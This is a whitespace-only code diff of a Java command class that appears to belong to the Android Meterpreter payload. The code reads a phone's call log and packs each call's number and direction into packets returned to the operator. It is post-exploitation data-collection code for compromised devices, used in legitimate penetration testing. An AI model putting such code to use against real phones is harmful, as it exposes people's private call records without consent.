@@ -32,7 +32,7 @@ public class dump_calllog_android implements Command {
 
     @Override
     public int execute(Meterpreter meterpreter, TLVPacket request,
-            TLVPacket response) throws Exception {
+                       TLVPacket response) throws Exception {
 
         Cursor cur = AndroidMeterpreter.getContext().getContentResolver()
                 .query(CallLog.Calls.CONTENT_URI, null, null, null, null);
@@ -60,17 +60,17 @@ public class dump_calllog_android implements Command {
 
             int dircode = Integer.parseInt(callType);
             switch (dircode) {
-            case CallLog.Calls.OUTGOING_TYPE:
-                dir = outgoing;
-                break;
+                case CallLog.Calls.OUTGOING_TYPE:
+                    dir = outgoing;
+                    break;
 
-            case CallLog.Calls.INCOMING_TYPE:
-                dir = incoming;
-                break;
+                case CallLog.Calls.INCOMING_TYPE:
+                    dir = incoming;
+                    break;
 
-            case CallLog.Calls.MISSED_TYPE:
-                dir = missed;
-                break;
+                case CallLog.Calls.MISSED_TYPE:
+                    dir = missed;
+                    break;
             }
             pckt.addOverflow(TLV_TYPE_CALLLOG_TYPE, dir);
             response.addOverflow(TLV_TYPE_CALLLOG_GROUP, pckt);
